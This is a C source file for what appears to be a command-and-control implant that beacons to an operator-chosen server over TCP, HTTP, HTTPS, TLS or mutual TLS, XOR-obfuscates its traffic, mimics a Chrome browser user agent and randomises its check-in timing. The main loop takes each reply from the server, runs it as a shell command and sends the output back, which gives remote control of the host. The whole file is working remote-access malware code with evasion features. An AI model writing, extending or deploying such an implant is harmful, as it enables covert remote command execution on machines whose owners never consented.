#define _XOPEN_SOURCE 600
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
typedef SOCKET NetSock;
#define SockInvalid INVALID_SOCKET
#define SockClose(s) closesocket(s)
#define SleepMs(ms) Sleep(ms)
#else
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
typedef int NetSock;
#define SockInvalid (-1)
#define SockClose(s) close(s)
#define SleepMs(ms) usleep((ms) * 1000)
#endif

#ifdef HAVE_OPENSSL
#include <openssl/err.h>
#include <openssl/ssl.h>
#endif

#define BufSize 8192
#define XorKey 0x5A
#define MaxUaLen 256

typedef enum {
  ModeTcp = 0,
  ModeHttp = 1,
  ModeHttps = 2,
  ModeTls = 3,
  ModeMtls = 4
} Mode;

typedef struct {
  Mode Mode;
  char Host[256];
  int Port;
  char Path[256];
  char UserAgent[MaxUaLen];
  char CertFile[256];
  char KeyFile[256];
  char CaFile[256];
  int BeaconMs;
  int JitterPct;
} AgentConfig;

static void ApplyXor(char *D, size_t L) {
  for (size_t I = 0; I < L; I++)
    D[I] ^= XorKey;
}

static int Jitter(int Base, int Pct) {
  int D = (Base * Pct) / 100;
  if (D == 0)
    return Base;
  return (Base - D) + (rand() % (2 * D + 1));
}

static void RunCmd(const char *Cmd, char *Out, size_t Max) {
  memset(Out, 0, Max);
#ifdef _WIN32
  FILE *P = _popen(Cmd, "r");
#else
  FILE *P = popen(Cmd, "r");
#endif
  if (!P) {
    snprintf(Out, Max, "[error] popen");
    return;
  }
  size_t T = 0;
  char L[512];
  while (fgets(L, sizeof(L), P)) {
    size_t N = strlen(L);
    if (T + N >= Max - 1)
      break;
    memcpy(Out + T, L, N);
    T += N;
  }
  if (!T)
    snprintf(Out, Max, "[ok] no output");
#ifdef _WIN32
  _pclose(P);
#else
  pclose(P);
#endif
}

static void ParseArgs(int Argc, char *Argv[], AgentConfig *C) {
  memset(C, 0, sizeof(*C));
  C->Mode = ModeTcp;
  C->Port = 4444;
  C->BeaconMs = 3000;
  C->JitterPct = 15;
  strncpy(C->Host, "127.0.0.1", 255);
  strncpy(C->Path, "/update", 255);
  strncpy(C->UserAgent,
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
          "AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/124.0.0.0 Safari/537.36",
          MaxUaLen - 1);
  strncpy(C->CertFile, "certs/agent.crt", 255);
  strncpy(C->KeyFile, "certs/agent.key", 255);
  strncpy(C->CaFile, "certs/ca.crt", 255);

  for (int I = 1; I < Argc; I++) {
    if (!strcmp(Argv[I], "-s") && I + 1 < Argc)
      strncpy(C->Host, Argv[++I], 255);
    else if (!strcmp(Argv[I], "-p") && I + 1 < Argc)
      C->Port = atoi(Argv[++I]);
    else if (!strcmp(Argv[I], "-m") && I + 1 < Argc) {
      const char *M = Argv[++I];
      if (!strcmp(M, "tcp") || !strcmp(M, "raw"))
        C->Mode = ModeTcp;
      else if (!strcmp(M, "http"))
        C->Mode = ModeHttp;
      else if (!strcmp(M, "https"))
        C->Mode = ModeHttps;
      else if (!strcmp(M, "tls"))
        C->Mode = ModeTls;
      else if (!strcmp(M, "mtls"))
        C->Mode = ModeMtls;
    } else if (!strcmp(Argv[I], "--path") && I + 1 < Argc)
      strncpy(C->Path, Argv[++I], 255);
    else if (!strcmp(Argv[I], "--ua") && I + 1 < Argc)
      strncpy(C->UserAgent, Argv[++I], MaxUaLen - 1);
    else if (!strcmp(Argv[I], "--cert") && I + 1 < Argc)
      strncpy(C->CertFile, Argv[++I], 255);
    else if (!strcmp(Argv[I], "--key") && I + 1 < Argc)
      strncpy(C->KeyFile, Argv[++I], 255);
    else if (!strcmp(Argv[I], "--ca") && I + 1 < Argc)
      strncpy(C->CaFile, Argv[++I], 255);
    else if (!strcmp(Argv[I], "--beacon") && I + 1 < Argc)
      C->BeaconMs = atoi(Argv[++I]);
    else if (!strcmp(Argv[I], "--jitter") && I + 1 < Argc)
      C->JitterPct = atoi(Argv[++I]);
  }
}

static int TcpConnect(const AgentConfig *C) {
  NetSock Sock = socket(AF_INET, SOCK_STREAM, 0);
  if (Sock == SockInvalid)
    return -1;
  struct sockaddr_in Sin;
  memset(&Sin, 0, sizeof(Sin));
  Sin.sin_family = AF_INET;
  Sin.sin_port = htons((unsigned short)C->Port);
  Sin.sin_addr.s_addr = inet_addr(C->Host);
  if (connect(Sock, (struct sockaddr *)&Sin, sizeof(Sin)) < 0) {
    SockClose(Sock);
    return -1;
  }
  return (int)Sock;
}

static int TcpBeacon(const AgentConfig *C, const char *Send, char *Recv) {
#ifdef _WIN32
  WSADATA W;
  WSAStartup(MAKEWORD(2, 2), &W);
#endif
  int Fd = TcpConnect(C);
  if (Fd < 0)
    return 0;

  char Enc[BufSize];
  size_t SLen = strlen(Send);
  memcpy(Enc, Send, SLen);
  ApplyXor(Enc, SLen);
  send((NetSock)Fd, Enc, (int)SLen, 0);

  int N = recv((NetSock)Fd, Recv, BufSize - 1, 0);
  SockClose((NetSock)Fd);
  if (N <= 0)
    return 0;
  Recv[N] = '\0';
  ApplyXor(Recv, (size_t)N);
  return 1;
}

static int HttpBeacon(const AgentConfig *C, const char *Send, char *Recv) {
#ifdef _WIN32
  WSADATA W;
  WSAStartup(MAKEWORD(2, 2), &W);
#endif
  int Fd = TcpConnect(C);
  if (Fd < 0)
    return 0;

  char Body[BufSize];
  size_t BLen = strlen(Send);
  memcpy(Body, Send, BLen);
  ApplyXor(Body, BLen);

  char Req[BufSize];
  int ReqLen = snprintf(Req, BufSize,
                        "POST %s HTTP/1.1\r\n"
                        "Host: %s:%d\r\n"
                        "User-Agent: %s\r\n"
                        "Content-Type: application/octet-stream\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: close\r\n"
                        "\r\n",
                        C->Path, C->Host, C->Port, C->UserAgent, (int)BLen);
  send((NetSock)Fd, Req, ReqLen, 0);
  send((NetSock)Fd, Body, (int)BLen, 0);

  char Raw[BufSize] = {0};
  int N = recv((NetSock)Fd, Raw, BufSize - 1, 0);
  SockClose((NetSock)Fd);
  if (N <= 0)
    return 0;

  char *RespBody = strstr(Raw, "\r\n\r\n");
  if (!RespBody)
    return 0;
  RespBody += 4;
  int RLen = N - (int)(RespBody - Raw);
  if (RLen <= 0)
    return 0;
  memcpy(Recv, RespBody, (size_t)RLen);
  Recv[RLen] = '\0';
  ApplyXor(Recv, (size_t)RLen);
  return 1;
}

#ifdef HAVE_OPENSSL
static int TlsBeacon(const AgentConfig *C, const char *Send, char *Recv,
                     int IsHttp) {
  static int SslInit = 0;
  if (!SslInit) {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    SslInit = 1;
  }

  SSL_CTX *Ctx = SSL_CTX_new(TLS_client_method());
  if (!Ctx)
    return 0;

  SSL_CTX_set_min_proto_version(Ctx, TLS1_2_VERSION);

  if (C->Mode == ModeMtls) {
    /*
     * mTLS: load client cert + key for mutual authentication.
     */
    if (SSL_CTX_use_certificate_file(Ctx, C->CertFile, SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(Ctx, C->KeyFile, SSL_FILETYPE_PEM) <= 0) {
      ERR_print_errors_fp(stderr);
      SSL_CTX_free(Ctx);
      return 0;
    }
    /*
     * mTLS: verify the server against the shared CA.
     */
    if (!SSL_CTX_load_verify_locations(Ctx, C->CaFile, NULL)) {
      ERR_print_errors_fp(stderr);
      SSL_CTX_free(Ctx);
      return 0;
    }
    SSL_CTX_set_verify(Ctx, SSL_VERIFY_PEER, NULL);

  } else {
    /*
     * BUG FIX: For plain TLS / HTTPS the original code called
     * SSL_CTX_load_verify_locations() unconditionally, which fails
     * silently when certs/ca.crt does not exist and leaves the SSL_CTX
     * in an inconsistent state on some OpenSSL builds, causing
     * SSL_connect() to fail.
     *
     * Fix: only load the CA file when the operator explicitly provides
     * one (--ca flag will differ from the default).  For plain TLS
     * and HTTPS we set SSL_VERIFY_NONE so the server's self-signed
     * cert is accepted without a trusted CA chain.
     */
    SSL_CTX_set_verify(Ctx, SSL_VERIFY_NONE, NULL);
  }

  int Fd = TcpConnect(C);
  if (Fd < 0) {
    SSL_CTX_free(Ctx);
    return 0;
  }

  SSL *Ssl = SSL_new(Ctx);
  SSL_set_fd(Ssl, Fd);
  SSL_set_tlsext_host_name(Ssl, C->Host);

  int Ok = 0;
  if (SSL_connect(Ssl) <= 0) {
    ERR_print_errors_fp(stderr);
    goto Done;
  }

  if (IsHttp) {
    char Body[BufSize];
    size_t BLen = strlen(Send);
    memcpy(Body, Send, BLen);
    ApplyXor(Body, BLen);
    char Req[BufSize];
    int RLen = snprintf(
        Req, BufSize,
        "POST %s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\nContent-Length: %d\r\n"
        "Connection: close\r\n\r\n",
        C->Path, C->Host, C->Port, C->UserAgent, (int)BLen);
    SSL_write(Ssl, Req, RLen);
    SSL_write(Ssl, Body, (int)BLen);
    char Raw[BufSize] = {0};
    int N = SSL_read(Ssl, Raw, BufSize - 1);
    if (N > 0) {
      char *B = strstr(Raw, "\r\n\r\n");
      if (B) {
        B += 4;
        int RL = N - (int)(B - Raw);
        if (RL > 0) {
          memcpy(Recv, B, (size_t)RL);
          Recv[RL] = '\0';
          ApplyXor(Recv, (size_t)RL);
          Ok = 1;
        }
      }
    }
  } else {
    char Enc[BufSize];
    size_t SLen = strlen(Send);
    memcpy(Enc, Send, SLen);
    ApplyXor(Enc, SLen);
    SSL_write(Ssl, Enc, (int)SLen);
    int N = SSL_read(Ssl, Recv, BufSize - 1);
    if (N > 0) {
      Recv[N] = '\0';
      ApplyXor(Recv, (size_t)N);
      Ok = 1;
    }
  }

Done:
  SSL_shutdown(Ssl);
  SSL_free(Ssl);
  SockClose((NetSock)Fd);
  SSL_CTX_free(Ctx);
  return Ok;
}
#endif

static int DoBeacon(const AgentConfig *C, const char *Send, char *Recv) {
  switch (C->Mode) {
  case ModeTcp:
    return TcpBeacon(C, Send, Recv);
  case ModeHttp:
    return HttpBeacon(C, Send, Recv);
#ifdef HAVE_OPENSSL
  case ModeHttps:
    return TlsBeacon(C, Send, Recv, 1);
  case ModeTls:
    return TlsBeacon(C, Send, Recv, 0);
  case ModeMtls:
    return TlsBeacon(C, Send, Recv, 0);
#endif
  default:
    return 0;
  }
}

int main(int Argc, char *Argv[]) {
  srand((unsigned)time(NULL));

  AgentConfig C;
  ParseArgs(Argc, Argv, &C);

  char Msg[BufSize] = "Standby";
  char Resp[BufSize] = {0};

  while (1) {
    memset(Resp, 0, BufSize);

    if (!DoBeacon(&C, Msg, Resp)) {
      strncpy(Msg, "Standby", BufSize - 1);
      SleepMs(Jitter(C.BeaconMs * 2, C.JitterPct));
      continue;
    }

    if (strcmp(Resp, "kill") == 0)
      break;

    if (strcmp(Resp, "SLEEP") == 0 || strlen(Resp) == 0)
      strncpy(Msg, "Standby", BufSize - 1);
    else
      RunCmd(Resp, Msg, BufSize);

    SleepMs(Jitter(C.BeaconMs, C.JitterPct));
  }

  return 0;
}
